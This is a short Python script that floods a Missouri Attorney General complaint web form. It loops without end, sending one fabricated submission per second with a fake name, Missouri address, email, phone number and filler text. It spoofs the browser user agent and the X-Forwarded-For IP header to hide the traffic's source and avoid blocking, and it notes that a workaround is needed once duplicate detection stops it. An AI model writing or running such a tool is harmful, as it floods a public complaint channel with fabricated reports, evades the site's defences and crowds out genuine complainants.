import requests
import json
import sys
import time
from faker import Faker

import address


fake = Faker()
URL = "https://ago.mo.gov/file-a-complaint/transgender-center-concerns?sf_cntrl_id=ctl00$MainContent$C001"
a=0

while True:
    missouri = address.Address.generate_MO_address()

    data = {"TextFieldController_4": fake.first_name(),
            "TextFieldController_5": fake.last_name(),
            "TextFieldController_1": missouri.street_address,
            "TextFieldController_2": missouri.city,
            "DropdownListFieldController": "MO",
            "TextFieldController_6": missouri.postcode,
            "TextFieldController_0": fake.free_email(),
            "TextFieldController_3": fake.phone_number(),
            "ParagraphTextFieldController": fake.paragraph(10)}

    data_json = json.dumps(data)
    headers = {"Content-Type": "application/json",
               "User-Agent": fake.user_agent(),
               "X-Forwarded-For": fake.ipv4(),
               "Cookie": ""}

    response = requests.post(URL, data=data_json, headers=headers)
    if not response.ok:
        print(f"Endpoint failed {response.status_code}")
        sys.exit(1)
    elif "already submitted" in response.text:
        print("Form already submitted, workaround required")
        sys.exit(1)
    
    a+=1
    print(f"Response submitted for {data['TextFieldController_5']}, {data['TextFieldController_4']}. This is submission #{a}")

    time.sleep(1)
